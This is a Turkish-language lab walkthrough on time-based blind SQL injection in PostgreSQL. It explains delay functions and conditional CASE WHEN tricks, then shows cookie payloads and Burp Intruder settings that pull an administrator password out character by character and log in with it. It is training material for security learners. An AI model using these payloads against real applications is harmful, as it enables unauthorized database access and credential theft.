# Blind SQL injection with time delays and information retrieval

## Konu Açıklaması (Exploiting Blind SQL Injection by Triggering Time Delays)
Uygulama SQL sorgularından dönen sonuçları veya veritabanı hata mesajlarını ekrana yansıtmayıp tamamen yutuyorsa, klasik `UNION` veya hata tabanlı (error-based) SQL injection yöntemleri sonuç vermez. Ayrıca uygulamanın koşullu boolean yanıtları (örneğin içeriğin değişmesi) da görünür bir fark yaratmıyorsa geriye **zaman gecikmeleri (time delays)** tekniği kalır.

Bu yöntemde, enjekte edilen koşullu SQL ifadesinin doğruluğu doğrudan sunucunun yanıt verme süresi (yanıtın gecikip gecikmediği) ölçülerek analiz edilir.

---

### Veritabanlarına Göre Zaman Geciktirme Fonksiyonları
| Veritabanı | Zaman Geciktirme Sözdizimi |
| --- | --- |
| **PostgreSQL** | `SELECT pg_sleep(10);` |
| **Microsoft SQL Server** | `WAITFOR DELAY '0:0:10'` |
| **MySQL** | `SELECT sleep(10);` |
| **Oracle** | `dbms_pipe.receive_message(('a'),10)` |

---

### Koşullu Gecikme (Conditional Time Delays) Mantığı
Bir şartın doğruluğuna göre zaman gecikmesi tetiklemek için `CASE WHEN` veya `IF` yapıları kullanılır:

```sql
-- PostgreSQL örneği:
SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END;

-- SQL Server örneği:
IF (1=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0';
```

* Eğer koşul **doğruysa** (`1=1`), veritabanı 10 saniye uyur ve HTTP yanıtı 10 saniye gecikmeli gelir.
* Eğer koşul **yanlışsa** (`1=2`), veritabanı hiç beklemez ve yanıt hemen döner.

---

### Koşullu Veri Çekme (Conditional Data Retrieval)
Hassas verileri (örneğin parolaları) karakter karakter sızdırmak için `SUBSTRING()` fonksiyonu koşullu gecikme ile birleştirilir:

```sql
SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, 1, 1) = 'a') 
THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users;
```
Bu sayede her karakter pozisyonu test edilerek verinin tamamı elde edilebilir.

---

## Lab Çözümü

### Lab Bilgileri
- **Lab Adı:** Blind SQL injection with time delays and information retrieval
- **Zafiyet Türü:** Blind SQL Injection (Time-Based / Time Delays)
- **Amaç:** `TrackingId` çerezindeki time-based Blind SQLi açığını kullanarak mantıksal zaman gecikmeleri ile `administrator` kullanıcısının parolasını karakter karakter tespit etmek ve bu parola ile sisteme giriş yapmak.
- **Elde Edilen Parola Değeri:**
  ```
  yy63ywtwnf8nfxhkr3fq
  ```

---

### Çözüm Adımları

#### 1. İsteği Yakalama ve Güvenlik Açığını Doğrulama (Koşullu Zaman Gecikmesi Testi)
* Web sitesinin ana sayfası ziyaret edilir ve Burp Suite **Proxy > HTTP history** sekmesinden `Cookie: TrackingId=...` içeren `GET /` isteği yakalanarak **Repeater**'a gönderilir (`Ctrl + R` / `Cmd + R`).
* PostgreSQL tabanlı koşullu zaman gecikmesi testi yapmak için `TrackingId` çerezi şu şekilde değiştirilir:
  ```http
  Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
  ```
  *(Burada `%3B` karakteri noktalı virgülün `;` URL-encode edilmiş halidir ve arkadaki sorguyu sonlandırıp yeni bir SQL ifadesi zincirler.)*
* **Gözlem:** Uygulamanın yanıt verme süresi yaklaşık **10 saniye** sürer.
* Koşulun yanlış olduğu durum test edilir:
  ```http
  Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
  ```
* **Gözlem:** Uygulama herhangi bir gecikme olmadan anında yanıt verir. Bu durum, mantıksal bir boolean koşulun doğruluğunun yanıt gecikmesiyle kesin olarak belirlenebileceğini kanıtlar.

#### 2. Kullanıcı Varlığının Doğrulanması (`administrator`)
* `users` tablosunda `administrator` kullanıcısının bulunup bulunmadığı kontrol edilir:
  ```http
  Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
  ```
* **Gözlem:** Sunucu yanıtı 10 saniye gecikir. Böylece `users` tablosunda `administrator` kullanıcısının varlığı doğrulanmış olur.

#### 3. Parola Uzunluğunun Tespiti
* Parolanın karakter uzunluğunu belirlemek için `LENGTH()` fonksiyonu ile koşullu gecikme testleri başlatılır:
  ```http
  Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
  ```
  *(Koşul doğru olduğu için 10 saniye gecikme gözlenir, yani parola 1 karakterden uzundur.)*
* Burp Repeater üzerinden sayı artırılarak takip eden istekler gönderilir:
  ```http
  Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
  ```
  ```http
  Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
  ```
* Sayı artırılarak devam edilir: `LENGTH(password)>20` test edildiğinde uygulama gecikme olmadan anında yanıt verir.
* **Gözlem:** Koşul yanlış hale geldiği için parolanın tam olarak **20 karakter** uzunluğunda olduğu tespit edilir.

#### 4. Burp Intruder Yapılandırması (Karakter Karakter Çıkarma)
* 20 karakterlik bir parolanın her basamağını manuel denemek çok fazla istek gerektireceğinden **Burp Intruder** kullanılır. Repeater'daki istek sağ tıklanarak Intruder'a gönderilir (`Ctrl + I` / `Cmd + I`).
* Intruder'da çerez değeri şu şekilde ayarlanır:
  ```http
  Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
  ```
  *(Buradaki `SUBSTRING(password,1,1)` fonksiyonu parolanın 1. indeksinden 1 karakter alır ve denenen değer ile karşılaştırır.)*
* Sadece `a` karakteri seçilerek **Add §** butonuna basılır ve payload pozisyonu işaretlenir:
  ```http
  Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
  ```
* **Payloads Sekmesi:**
  - `Payload type: Simple list` olarak seçilir.
  - Parolanın yalnızca küçük harf ve rakamlardan oluştuğu varsayımıyla, `Payload configuration` altındaki **Add from list** açılır menüsünden `a-z` ve `0-9` aralığındaki tüm karakterler listeye eklenir.
* **Resource Pool Ayarı (Tek İş Parçacığı - Kritik Adım):**
  - Zaman tabanlı gecikmelerde isteklerin eşzamanlı gönderilmesi gecikmelerin birbirine karışmasına ve hatalı sonuçlara sebep olur.
  - **Resource pool** sekmesine gidilir ve `Maximum concurrent requests` değeri **1** (single-thread) olarak ayarlanır.
* **Start attack** butonuna basılarak saldırı başlatılır.

#### 5. Sonuçların Analizi ve Tüm Parolanın Elde Edilmesi
* Saldırı sonuçlarında **Response received** sütunu izlenir (bu sütun sunucunun yanıt verme süresini milisaniye cinsinden gösterir).
* Hatalı karakterler anında dönerken (~50-200 ms), doğru karaktere denk gelen satır yaklaşık **10,000 milisaniye** (~10 saniye) sürecektir. Bu satırdaki payload, parolanın 1. karakterini verir.
* 1. karakter bulunduktan sonra Intruder'a dönülerek `SUBSTRING` ofset değeri `2` yapılır:
  ```http
  Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
  ```
* Saldırı yeniden başlatılır ve 2. karakter bulunur.
* Aynı döngü 3, 4, ... 20. karaktere kadar sürdürülerek 20 karakterin tamamı elde edilir:
  ```
  yy63ywtwnf8nfxhkr3fq
  ```

#### 6. Sisteme Giriş ve Labın Tamamlanması
* Tarayıcıda **My account** bağlantısına tıklanarak giriş sayfasına gidilir.
* Bilgiler girilir:
  - **Username:** `administrator`
  - **Password:** `yy63ywtwnf8nfxhkr3fq`
* Giriş yapılır ve laboratuvar başarıyla tamamlanır.
